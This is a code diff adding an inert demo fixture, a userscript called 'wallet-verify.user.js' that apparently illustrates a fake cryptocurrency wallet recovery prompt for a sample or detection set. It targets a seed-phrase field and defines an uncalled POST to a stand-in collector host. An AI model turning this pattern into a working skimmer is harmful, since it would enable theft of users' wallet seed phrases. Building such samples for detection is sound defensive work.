@@ -79,3 +79,22 @@ SAMPLES.bot = {
     '}',
   ].join('\n'),
 };
+
+SAMPLES.recovery = {
+  name: 'wallet-verify.user.js',
+  source: [
+    '// ==UserScript==',
+    '// @name   Wallet verification [demo]',
+    '// @match  https://wallet.example.invalid/*',
+    '// ==/UserScript==',
+    '',
+    '// Browser analogue of a fake wallet recovery prompt.',
+    '// This fixture reads no actual data and sends nothing.',
+    'function showRecoveryEvidence() {',
+    '  document.querySelector("#seed-phrase");',
+    '  // Suspicious POST shape; the endpoint is reserved and this is inert.',
+    '  const example = () => fetch("https://collector.example.invalid/", { method: "POST" });',
+    '  return typeof example;',
+    '}',
+  ].join('\n'),
+};
